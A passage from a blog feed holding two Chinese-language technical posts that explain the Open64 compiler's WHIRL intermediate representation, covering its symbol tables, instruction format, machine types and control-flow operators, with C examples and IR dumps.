  <span class="kt">void</span> <span class="n">AddSymInfo</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="n">SymInfo</span> <span class="o">*</span><span class="n">info</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">symbols</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">info</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// more methods ...</span>
<span class="p">};</span>
</code></pre></div></div>

<p>通过这种简单的数据结构，我们可以解决上述提出的三个问题，每个SymTreeNode代表一个scope，每个节点只能递归的访问super scope，并且不能访问。当通过访问者模式遍历语法树进行语意分析时，可以边访问树节点，边构建或查询符号表。</p>

<p>这种简单的结构处理一下C语言没什么问题，但是设计上仍然有很多问题，首先无法自顶向下的访问整个符号表，由于设计只考虑了scope的特点，只能自底向上的访问符号表，其次，无法通过随机访问的方式获得符号表项，并且符号表保存的信息不够丰富等等。总的来说，这个结构的使用效率不高，信息粒度也不够细。提出这个结构只是为了更详细的解释一下符号表的功能，接下来让我们把视线转到WHIRL的符号表。</p>

<h2 id="whirl-symbol-table">WHIRL Symbol Table</h2>

<p>WHIRL符号表不像上述设计只有一个表结构，它包含了一系列表格用于编译、优化并且保证运行于存储的效率。从宏观上看，WHIRL的符号表被分成了<strong>全局(Global Part)</strong>和<strong>本地(Local Part)</strong>两部分，如下图所示：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/2_ST_ow.png" alt="whirl symbol table" /></p>

<p>可以看到Global SYMTAB保存了许多用于全局访问的信息，例如用于存储类型信息TY_TAB和存储函数信息的PU_TAB等等。每个函数(Program Unit)自己也维护一个本地的符号表，其中包含了更多的详细局部信息，比如保存了伪寄存器信息的PREG_TAB等等。</p>

<p>可以看出WHIRL Symbol Table的本地表并不是树形结构，只有几个独立的线性表，这种设计可以提高符号表的读写速度。</p>

<p>我们接下来介绍各个表的大概功能和结构：</p>

<h3 id="st_tab">ST_TAB</h3>

<p>这个表有点类似于上面提到的狭义的符号表，也是整个符号表中最重要的模块之一，任何有名字的符号（变量、函数、伪寄存器）都被包括在这个表中。每一个表项 (ST Entry) 都有一个独一无二的索引<strong>ST_IDX</strong>。</p>

<p>事实上后续介绍的各个表都会给其表项提供一个独一无二的索引例如 TY_TAB 表的 TY_IDX，用于实现表项的随机访问，后续不再赘述。</p>

<p>ST Entry包含了对应符号的详细信息，例如名称、属性、type、符号类型、存储类型等等，其结构如下：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/3_st_entry.png" alt="ST" /></p>

<p>根据上述信息我们可以发现，即使是函数中有多个重名变量也为所谓，因为访问符号表并不是通过符号名或者其哈希值作为访问的key，而是通过唯一的ST_IDX或者ST Entry指针进行访问，符号名仅作为一个信息存储起来。该结构体中的表项不再详细介绍，看名字和描述基本上可以推断出相关信息。值得注意的是，ST表的索引也会被对应的WHIRL指令所保存，用于记录该指令的符号信息。我们通过一个简单的程序举个例子：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>该程序的局部符号表中变量b对应的Entry如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">=======================================================================</span>
SYMTAB <span class="k">for </span>main: level 2, st 9, label 0, preg 0, inito 0, st_attr 0
<span class="o">=======================================================================</span>

Symbols:
<span class="o">[</span>1]: b  &lt;2,1&gt; Variable of <span class="nb">type</span> .predef_I4 <span class="o">(</span><span class="c">#4, I4)</span>
        Address: 0<span class="o">(</span>b&lt;2,1&gt;<span class="o">)</span>  Alignment: 4 bytes
        location: file <span class="o">(</span>null<span class="o">)</span>, line 3
        Flags:  0x00000000    Flags_ext: 0x02200000 modified used, XLOCAL
</code></pre></div></div>

<p>SYMTAB的level用于区分是全局表还是本地表，可以看到main的level为2，是本地表，全局表的level应当为1。其中<strong>b &lt;2,1&gt;</strong> 2是level，保存在ST_IDX的低8位中，1则是在当前表中的index，这里的index是ST_IDX的高24bits。紧随其后的是当前符号的类型信息，可以看到变量b的类型为int类型，在WHIRL中表示为 <code class="language-plaintext highlighter-rouge">.predef_I4</code>， 代表预定义的基本类型。这里类型 TY 与上一篇文章介绍的 MTYPE 有所不同，MTYPE用于表示机器类型，即寄存器或者CPU能处理底层类型。而这里的TY则是高级的，保留了前端语意信息的类型，例如struct或者class等等，应当与MTYPE作区分。</p>

<h3 id="pu_tab">PU_TAB</h3>

<p>PU是Procedure Unit的缩写，在WHIRL中代表函数。PU_TABLE则保存了当前文件中所有的函数原型(Prototype)和函数声明(Declaration)，PU Entry的结构大致如下图：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/4_pu_entry.png" alt="PU" /></p>

<p>由于Open64后来进行了一系列更新，该结构体新增加了一个比较重要的成员 <code class="language-plaintext highlighter-rouge">TY_IDX base_class</code>，当该函数是某个struct/class的成员函数时，base_class 记录其owner的类型。</p>

<h3 id="ty_tab">TY_TAB</h3>

<p>该表记录了编译器前端保留的所有high-level type，包括基本的标量类型(Scalar Type)、指针类型以及更复杂的聚合类型(Aggregate Type)。每一个TY Entry保留了对应类型的详细信息，例如类型的大小和对齐信息、对应的MTYPE、数组元素类型信息以及pointee type等等。其结构如下图：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/5_ty_entry.png" alt="TY" /></p>

<p>我们以如下代码为例：</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">A</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">num</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
  <span class="k">struct</span> <span class="nc">A</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>该结构体对应的TY打印出的信息如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>66]: A  : <span class="o">(</span>f: 0x0000<span class="o">)</span> size 112 M: STRUCT
        0    num  .predef_I4 <span class="o">(</span><span class="c">#4) align 4  fl:0x0080</span>
        4    name <span class="o">(</span>anon<span class="o">)</span> <span class="o">(</span><span class="c">#67) align 1     fl:0x0080</span>
        104  next  anon_ptr. <span class="o">(</span><span class="c">#68) align 8 fl:0x0081 last_field</span>

<span class="o">[</span>67]: <span class="o">(</span>anon<span class="o">)</span>    : <span class="o">(</span>f: 0x0020 anonymous<span class="o">)</span> size 100 M: ARRAY of .predef_I1 <span class="o">(</span><span class="c">#2) align 1 (0:99:0:)</span>

<span class="o">[</span>68]: anon_ptr. : <span class="o">(</span>f: 0x0000<span class="o">)</span> size 8 U8: -&gt; A <span class="o">(</span><span class="c">#66) align 8</span>
</code></pre></div></div>

<p>以上信息打印出了struct A的详细类型信息，我们以其第三个成员 <strong>next</strong> 为例，开头的104是该成员与结构体开始地址的偏移，紧随其后的是该成员的name，之后的<code class="language-plaintext highlighter-rouge">anon_ptr. (#68)</code>为当前成员的类型，一个匿名指针类型，该类型在TY_TABLE中的index为68，可以看出该指针的pointee type为 <code class="language-plaintext highlighter-rouge">struct A *</code> 类型。之后的 <code class="language-plaintext highlighter-rouge">align 8</code> 表示该类型8字节对齐。接下来 <code class="language-plaintext highlighter-rouge">fl:0x0080</code> 则记录了该成员的更多详细细节，通过16位的flag记录，本文不再详细介绍flag信息。最后last_field表示当前成员是最后一个field。</p>

<h3 id="fld_tab">FLD_TAB</h3>

<p>该表的每个Entry都提供了关于 <strong>struct</strong> 或 <strong>union</strong> 中的field信息。结构类型的TY指向第一个field的FLD条目。其余field紧随在连续的FLD_TAB项中，直到有一个标志表明它是最后一个field为止。FLD Entry的结构如下，大小为24字节:</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/6_fld_entry.png" alt="FLD" /></p>

<p>其中 <code class="language-plaintext highlighter-rouge">bsize</code> 和 <code class="language-plaintext highlighter-rouge">bofst</code> 这两个成员记录了bit field的位长和偏移。bit field是C/C++里用的不太多的特性，简单来说就是可以更精确的控制field的位长，例如：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">A</span> <span class="p">{</span>
 <span class="kt">int</span> <span class="n">a</span> <span class="o">:</span> <span class="mi">4</span><span class="p">;</span>  <span class="c1">// 4 bits</span>
 <span class="kt">char</span> <span class="n">b</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 1 bits</span>
<span class="p">};</span>
</code></pre></div></div>

<p>成员a和b的位长分别为4位和1位，这种语法特性可以让程序员更加极致的使用内存，同时也增大了编译器处理结构体内存对齐的复杂度。</p>

<h3 id="arb_tab">ARB_TAB</h3>

<p>该表的每个Entry都提供了关于数组维数的信息。数组类型对应的TY Entry包含了第一个维度的ARB Entry指针，由ARB_FIRST_DIMEN表示。对于C/C++数组，这对应于最左边的维度。</p>

<h3 id="tcon_tab">TCON_TAB</h3>

<p>TCON用于存储整数、浮点数或者字符串常量的值。该表的前三个条目被保留。第一个条目 (index 0) 为未初始化的索引所保留的值。第二个条目 (index 1) 包含4字节的浮点值0.0。第三个条目(index 2)包含8字节浮点值0.0。这些条目是共享的。所有其他值都是独立输入的，不检查是否重复。TCON表项的结构如下，大小为40字节:</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/7_tcon_entry.png" alt="TCON" /></p>

<p>一般各种变量的初始化值都被保存为TCON。</p>

<h3 id="inito_tab">INITO_TAB</h3>

<p>该表的表项用于描述全局变量或者静态变量的初始化值，真实的初始化值被存储在INITV_TAB中，而INITO_TAB则维护变量与INITV Entry的映射关系。INITO Entry的结构如下图：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/inito_entry.png" alt="INITO" /></p>

<h3 id="initv_tab">INITV_TAB</h3>

<p>INITV主要记录了各种初始化值，简单的标量值由一个INITV对象进行表示，复杂数据对象的初始值由一个INITV树进行表示，其根由INITV的INITV_IDX指定，INITV条目的结构如下，大小为16字节:</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/8_initv_entry.png" alt="INITV" /></p>

<p>可以看到tc成员记录了初始化值的TCON_IDX，用于在TCON_TAB中获取对应的常数值。而blk成员则用于表示 struct/union 这种复杂的初始化值的聚合，其对应的子INITV节点相当于一颗子树，记录了更多复杂的初始化信息。</p>

<h3 id="str_tab">STR_TAB</h3>
<p>该表保存了Symbol、types、label等名称的所有字符串。该表可以被视为字符串的存储区域块。STR_IDX是该表的索引，实际上是这个存储块中的偏移量，它给出字符串的开始字符的字节偏移量。所有字符串都以空结尾，并且块的第一个字符总是空的。因此，零STR_IDX表示空字符串。这个表的设计很像ELF文件里的 <code class="language-plaintext highlighter-rouge">.shstrtab</code> 或者 <code class="language-plaintext highlighter-rouge">.strtab</code>，都是通过偏移访问字符串的值。</p>

<h2 id="总结">总结</h2>

<p>以上大致介绍了WHIRL Symbol Table中比较重要的几个表，还剩下几个BLK_TAB、LABEL_TAB这种比较简单的表，本文就不再详细展开。语法树和IR都非常依赖符号表的信息，但是访问符号表的方式和需要又有所区别，因此符号表的设计应当考虑到各方面的应用场景，降低算法的复杂度并且提高内存的利用效率。作者并没有深入了解LLVM符号表的相关实现，本文就不再深入对比两个符号表设计上的差异。感兴趣的朋友可以参考一下<a href="https://github.com/open64-compiler/open64/">Open64</a>新添加的<a href="https://github.com/open64-compiler/open64/blob/develop/osprey/ir_tools/whirl2llvm.cxx">WHIRL to LLVM</a> 的原型模块 (这个模块是我写的 ^_^)，能够更深入的体会到两种IR甚至是两个编译器设计上的差异。</p>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="Compiler" /><category term="Open64" /><summary type="html"><![CDATA[Open64中非常神奇的符号表]]></summary></entry><entry><title type="html">WHIRL相关笔记(1)</title><link href="http://localhost:4000/blog/whirl" rel="alternate" type="text/html" title="WHIRL相关笔记(1)" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>http://localhost:4000/blog/whirl</id><content type="html" xml:base="http://localhost:4000/blog/whirl"><![CDATA[<h2 id="序">序</h2>

<p>最近在公司做一个 RISC-V 的编译器, 要把 <a href="https://github.com/open64-compiler/open64">Open64</a> 的全局标量优化器 WOPT 接到 LLVM 的 Codegen 模块上，让 LLVM 去做 Code Generation 的工作。WOPT的 output 是一个相当经典的 IR，叫做WHIRL。至于为啥要用 Open64，我个人认为 Open64 的循环优化和标量优化比 LLVM 激进许多，优化效果也更好。由于 Open64 的文档十分稀少，我只能边读代码边问赖师傅（逃，写这篇文章记录一下我学到的知识。</p>

<h2 id="whirl简介">WHIRL简介</h2>

<p>WHIRL 是树形结构，并且具有5层抽象的 Muti-Level IR，它负责粘合 Open64 各个模块。作为抽象的 IR，你可以把任何前端接到 WHIRL 上，Open64 本身支持 C/C++、Java、FORTRAN 的前端，目前我们移植了 clang 作为最新的 C/C++ 前端。多层抽象的结构让 WHIRL 保存了足够多的信息来提高优化的结果，比如 WHIRL 收集的 induct variable 和 loop condition 相关的信息可以提高循环相关的优化的效率和结果。这些信息并不像LLVM转成 Low-Level 之后从新计算得到的，此时一些信息已经丢失了，比如循环以及循环嵌套深度之类的，需要重新根据支配性和数据流去计算（Pattern Match）。而 WHIRL 是直接从 Very High Level 保留循环的相关信息，在后续的优化中会把循环 normalize 到 Do-While 的形式，并持续补全必要的数据，最终传递到 Loop-Nest Optimezer(LNO) 中进行优化。</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl_struct.png" alt="whirl_struct" /></p>

<p>一提到 IR 大家脑子里第一个反应估计就是三地址码 (Three address code) 或者 LLVM 那种 SSA 的形式。实际上有各种各样的 IR，线形的、树形的、图形的（Eg. <a href="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/sea_of_nodes.pdf">sea-of-nodes</a>）等等。上文提到 WHIRL 是树形的，下图是个简单的例子：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl_example.png" alt="whirl_example" /></p>

<p>比较关键的点就是：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   I4I4LDID 0 &lt;2,1,a&gt; T&lt;4,.predef_I4,4&gt;         |=== Level 2
   I4I4LDID 0 &lt;2,2,b&gt; T&lt;4,.predef_I4,4&gt;         |=== Level 2
  I4ADD                                       |=== Level 1
 I4RETURN_VAL {line: 1/2}                   &lt;=== Level 0
</code></pre></div></div>

<p>可能大家对树形的 IR 见的并不多，我第一次见到树形的 IR 是在虎书里，树形 (tree-based) IR 和 抽象语法树 (AST) 非常接近，稍微修饰或者调整一下就可以从 AST 发射到 树形 IR，因此树形 IR 的一个好处就是可以方便的表示高级的或者抽象的结构，例如循环，分支等。你甚至可以将其无损的转换回 AST结构或者源代码,Very High WHIRL可以转换回 FORTRAN。随着编译优化的逐步进行，IR 将一步步的 Lowing 到更加底层的形式，例如将分支循环转换成 <code class="language-plaintext highlighter-rouge">GOTO</code> 语句和基本块的形式。当然树形 IR 并不太适合做数据流分析，在Open64 中 WHIRL 主要用来做粘合剂，标量优化 (Scalar Optimization) 主要在 SSA 上进行，循环相关的优化可以在 WHIRL 上做。</p>

<h2 id="whirl的构成">WHIRL的构成</h2>

<p>IR 通常有三部分组成，控制流 (Control Flow)、指令和符号表 (Symbol Table)。WHIRL 也不例外，指令会被结构化的控制流包装起来，存放在<strong>程序单元</strong>(Program Units)中，类似于 LLVM Module 的概念。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">f</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">short</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>该函数对应的 WHIRL:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FUNC_ENTRY &lt;1,60,f&gt; {line: 1/1}
 IDNAME 0 &lt;2,1,a&gt;
 IDNAME 0 &lt;2,2,b&gt;
BODY
 BLOCK {line: 1/1}
 IF {line: 1/2}
   I4I4LDID 0 &lt;2,1,a&gt; T&lt;4,.predef_I4,4&gt;
   I4INTCONST 0 (0x0)
  I4I4GT
 THEN
  BLOCK {line: 0/0}
    I4I4LDID 0 &lt;2,1,a&gt; T&lt;4,.predef_I4,4&gt;
    I4I2LDID 0 &lt;2,2,b&gt; T&lt;3,.predef_I2,2&gt;
   I4ADD
  I4RETURN_VAL {line: 1/3}
  END_BLOCK
 ELSE
  BLOCK {line: 0/0}
    I4I4LDID 0 &lt;2,1,a&gt; T&lt;4,.predef_I4,4&gt;
    I4I2LDID 0 &lt;2,2,b&gt; T&lt;3,.predef_I2,2&gt;
   I4MPY
  I4RETURN_VAL {line: 1/5}
  END_BLOCK
 END_IF
 RETURN {line: 1/7}
 END_BLOCK
</code></pre></div></div>

<p>里面的 <code class="language-plaintext highlighter-rouge">IF</code> 和 <code class="language-plaintext highlighter-rouge">ELSE</code> 就是控制流相关的结构，。</p>

<h3 id="instruction">Instruction</h3>

<p>首先我们介绍指令，指令在代码中被实现为 <code class="language-plaintext highlighter-rouge">WN</code> 结构体。指令一共分为两种：<strong>Statement</strong> 和 <strong>Expression</strong>，Statement 是指可能有副作用 (Side effects) 的指令，例如 <code class="language-plaintext highlighter-rouge">CALL</code> 和 <code class="language-plaintext highlighter-rouge">ISTORE</code>，Expression 则是指没有副作用的语句，例如 <code class="language-plaintext highlighter-rouge">ADD</code>, <code class="language-plaintext highlighter-rouge">ILOAD</code> 等运算指令。副作用可以简单的理解为不会修改程序的内存。</p>

<p>整个程序就是由 stmt 和 expr 构成一个树的结构，值得注意的是 stmt 的后代只能是 expr，同时 stmt 不可以是 expr 的后代 (在 VH WHIRL 中有例外)，例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  I4I4LDID  0  &lt;2,1,a&gt;   T&lt;4,.predef_I4,4&gt;                   |=== EXPR: LDID
I4STID  0  &lt;2,3,c&gt;   T&lt;4,.predef_I4,4&gt; {line: 1/2}        &lt;=== STMT: STID
   |    |-------|           |
   |        |               |
operator  operands    High Level Type
</code></pre></div></div>

<p>一条指令由<strong>操作符</strong>(Operator)、<strong>返回类型</strong>(rtype) 和<strong>描述符类型</strong>(desc) 组成。操作符就是每条指令前面说明这条指令是做什么的，例如 <code class="language-plaintext highlighter-rouge">ADD</code>。返回类型指的是这条指令返回值的类型，描述符类型指的是操作数 (Operands) 的类型。例如 <code class="language-plaintext highlighter-rouge">I4I2LDID 0 &lt;2,2,b&gt; T&lt;3,.predef_I2,2&gt;</code> 的返回类型就是 <code class="language-plaintext highlighter-rouge">I2</code>，指两个字节的有符号整数，描述符类型则是 <code class="language-plaintext highlighter-rouge">I4</code>，指四个字节的有符号整数。</p>

<blockquote>
  <p>这里的I4实际上是个指针类型，WHIRL中指针和Int不做区分</p>
</blockquote>

<p>以上三个属性就限定一条 WHIRL Instruction。</p>

<h3 id="data-types">Data Types</h3>

<p>WHIRL 支持一下这些类型：</p>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>B</td>
      <td>boolean</td>
    </tr>
    <tr>
      <td>I1</td>
      <td>8-bit signed integer</td>
    </tr>
    <tr>
      <td>I2</td>
      <td>16-bit signed intege</td>
    </tr>
    <tr>
      <td>I4</td>
      <td>32-bit signed intege</td>
    </tr>
    <tr>
      <td>I8</td>
      <td>64-bit signed intege</td>
    </tr>
    <tr>
      <td>U1</td>
      <td>8-bit unsigned integer</td>
    </tr>
    <tr>
      <td>U2</td>
      <td>16-bit unsigned integer</td>
    </tr>
    <tr>
      <td>U4</td>
      <td>32-bit unsigned integer</td>
    </tr>
    <tr>
      <td>U8</td>
      <td>64-bit unsigned intege</td>
    </tr>
    <tr>
      <td>A4</td>
      <td>32-bit address (behaves as unsigned)</td>
    </tr>
    <tr>
      <td>A8</td>
      <td>64-bit address (behaves as unsigned)</td>
    </tr>
    <tr>
      <td>F4</td>
      <td>32-bit IEEE floating point</td>
    </tr>
    <tr>
      <td>F8</td>
      <td>64-bit IEEE floating point</td>
    </tr>
    <tr>
      <td>F10</td>
      <td>80-bit IEEE floating point</td>
    </tr>
    <tr>
      <td>F16</td>
      <td>128-bit IEEE floating point</td>
    </tr>
    <tr>
      <td>FQ</td>
      <td>128-bit SGI floating point</td>
    </tr>
    <tr>
      <td>C4</td>
      <td>32-bit complex (64 bits total)</td>
    </tr>
    <tr>
      <td>C8</td>
      <td>64-bit complex (128 bits total)</td>
    </tr>
    <tr>
      <td>CQ</td>
      <td>128-bit complex (256 bits total).</td>
    </tr>
    <tr>
      <td>V</td>
      <td>Void</td>
    </tr>
    <tr>
      <td>M</td>
      <td>Struct and Array</td>
    </tr>
    <tr>
      <td>BS</td>
      <td>bits</td>
    </tr>
  </tbody>
</table>

<p>以上类型被称为 Machine type(Mtype)，机器可以很容易表示的类型，一般写在指令的最前面，如 <code class="language-plaintext highlighter-rouge">I4ADD</code>。而我们注意到指令中还有 <code class="language-plaintext highlighter-rouge">T&lt;3,.predef_I2,2&gt;</code> 这样的类型描述，这个T开头的类型则指出了指令的 High-Level 的类型，比如 struct，array 等，并且 High-Level 的类型会被存放在 WHIRL 的符号表中。</p>

<p>例如，以下 struct 在符号表中的表示：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">list_data_s</span> <span class="p">{</span>
    <span class="kt">short</span> <span class="n">data16</span><span class="p">;</span>
    <span class="kt">short</span> <span class="n">idx</span><span class="p">;</span>
<span class="p">}</span> <span class="n">list_data</span><span class="p">;</span>
</code></pre></div></div>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/struct_in_symtab.png" alt="struct_in_symtab" /></p>

<h3 id="kids-pointer">Kids Pointer</h3>

<p>对于所有非叶子节点的指令，都有一个指其 kids 也就是其 Operands 的指针数组，对于能够确定 kids 数量的指令 kid_count 会指出它有都少操作数，对于 <code class="language-plaintext highlighter-rouge">BLOCK</code> 这种子节点数量不知道的指令，其使用 <code class="language-plaintext highlighter-rouge">first</code> 和 <code class="language-plaintext highlighter-rouge">last</code> 指针来维护一个双向链表。</p>

<h3 id="instruction-layout">Instruction Layout</h3>

<p>如上文提到，每条 Instruction 都是一个 WHIRL node，被表示成 <code class="language-plaintext highlighter-rouge">WN</code> 的结构体形式。<code class="language-plaintext highlighter-rouge">WN</code> 最小是24个字节，有两个操作数。如果超过两个操作数，则在该结构体的末端扩展内存来存放 kid pointers.
<img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/WN_layout.png" alt="wn_layout" /></p>

<h3 id="structured-control-flow-statements">Structured Control Flow Statements</h3>

<p>WHIRL 中的结构化控制流语句是分层的 (hierarchical)，该结构中的所有 STMT 都是他的子节点。所有控制流语句的 rtype 和 desc 都是 “V”。下面来介绍各种结构化控制流语句。</p>

<ul>
  <li>FUNC_ENTRY
    <ul>
      <li>这个操作符代表函数入口，并且该操作符是每棵树的根节点。Kids 0..n-4 是 <code class="language-plaintext highlighter-rouge">IDNAME</code>，代表函数的形参</li>
      <li>Kid n-3 和 n-2 都是是一个 <code class="language-plaintext highlighter-rouge">BLOCK</code>，它包含一系列 <code class="language-plaintext highlighter-rouge">PRAGMA</code>，可以理解为c/c++中的 <code class="language-plaintext highlighter-rouge">#pragma</code></li>
      <li>Kid n-1 是一个 <code class="language-plaintext highlighter-rouge">BLOCK</code>，它代表函数体</li>
    </ul>
  </li>
  <li>BLOCK
    <ul>
      <li>它包含任意数量的 STMT，并且维护成双向链表的形式</li>
    </ul>
  </li>
  <li>DO_LOOP
    <ul>
      <li>用于表示 FORTRAN 中的 Do-Loop</li>
    </ul>
  </li>
  <li>DO_WHILE
    <ul>
      <li>kid 0 是布尔表达式，代表循环条件</li>
      <li>kid 1 是循环体</li>
      <li>循环条件将在循环体最后被测试</li>
    </ul>
  </li>
  <li>WHILE_DO
    <ul>
      <li>kid 0 是布尔表达式</li>
      <li>kid 1 是循环体</li>
      <li>循环条件在最开始被测试</li>
    </ul>
  </li>
  <li>IF
    <ul>
      <li>用于表示程序中的 if 语句</li>
      <li>kid 0 是条件表达式</li>
      <li>kid 1 是 then-block</li>
      <li>kid 2 是 else-block</li>
    </ul>
  </li>
</ul>

<p>DO_LOOP, DO_WHILE, WHILE_DO 和 IF只表示正常的 (well-formed) 高级控制流结构，不允许从外部直接 goto 到这些块，如果前端存在非法的控制流块，在第一个优化阶段，将筛选出此类非法的高级控制结构，并将其转换为普通控制流结构。</p>

<h3 id="other-control-flow-statements">Other Control Flow Statements</h3>

<p>其余的控制流语句都不是分层的。他们存在于所有level 的 WHIRL 中。</p>

<ul>
  <li>GOTO
    <ul>
      <li>无条件跳转</li>
    </ul>
  </li>
  <li>GOTO_OUTER_BLOCK
    <ul>
      <li>从嵌套过程到父过程中标签的无条件跳转。它涉及过程调用堆栈的展开。</li>
    </ul>
  </li>
  <li>SWITCH
    <ul>
      <li>跟源代码中的 switch 语句很接近</li>
      <li>number entries 表示它跳转表的数量</li>
      <li>kid 0 是条件表达式</li>
      <li>kid 1 是他的跳转表</li>
      <li>kid 2 是他的 defautl block</li>
    </ul>
  </li>
</ul>

<p>例如：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">f</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="k">return</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
        <span class="nl">default:</span> <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>其 switch 语句为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SWITCH 2 258 {line: 1/3}
  I4I4LDID 0 &lt;2,3,_temp__switch_index0&gt; T&lt;4,.predef_I4,4&gt;
  BLOCK {line: 0/0}
  CASEGOTO L514 1 {line: 1/3}
  CASEGOTO L770 2 {line: 1/3}
  END_BLOCK
  GOTO L1026 {line: 1/6}
END_SWITCH
</code></pre></div></div>

<ul>
  <li>CASEGOTO
    <ul>
      <li>只存在于 SWITCH 中，用于表示条件跳转</li>
      <li><code class="language-plaintext highlighter-rouge">CASEGOTO L514 1</code> 表示 cond 为1就跳到 L514</li>
    </ul>
  </li>
  <li>COMPGOTO
    <ul>
      <li>和 SWITCH 很类似，唯一的区别是他的 case 永远从 0 开始，因此它的 <code class="language-plaintext highlighter-rouge">BLOCK</code> 中只有 <code class="language-plaintext highlighter-rouge">GOTO</code></li>
      <li>该语句通常出现在 M/L WHIRL 中，即 SWITCH 被优化过的结果</li>
    </ul>
  </li>
  <li>TRUEBR
    <ul>
      <li>条件跳转指令</li>
      <li>kid 0 是条件表达式，为 true 则跳转至对应的 BLOCK，常用见 IF 语句被优化之后的结果</li>
    </ul>
  </li>
  <li>FALSEBR
    <ul>
      <li>和 TRUEBR 类似</li>
      <li>kid 0 是条件表达式，为 false 则跳转至对应的 BLOCK，常用见 IF 语句被优化之后的结果</li>
    </ul>
  </li>
  <li>RETURN
    <ul>
      <li>无返回值的 return</li>
    </ul>
  </li>
  <li>RETURN_VAL
    <ul>
      <li>kid 0 是其返回值</li>
    </ul>
  </li>
  <li>LABEL
    <ul>
      <li>代表一个基本块的开始，和 C/C++ 里的 label 一样</li>
